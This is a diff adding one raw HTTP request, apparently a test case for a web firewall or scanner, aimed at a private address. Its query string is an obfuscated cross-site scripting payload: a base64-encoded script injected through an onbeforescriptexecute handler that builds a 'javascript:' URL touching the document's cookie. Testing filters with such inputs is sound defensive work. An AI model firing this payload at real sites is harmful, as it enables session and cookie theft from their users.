@@ -1,0 +1,7 @@
+GET /?%22%3E%3CBODy%20onbeforescriptexecute=IngxPSdjb29raWUnO2M9JyknO2I9J2EnO2xvY2F0aW9uPSdqYXYnK2IrJ3NjcmlwdDpjb24nKydmaXJtKCcrJ2RvY3VtZW50JysnLicreDErYyI+ HTTP/1.1
+Host: 10.20.186.207:1111
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+
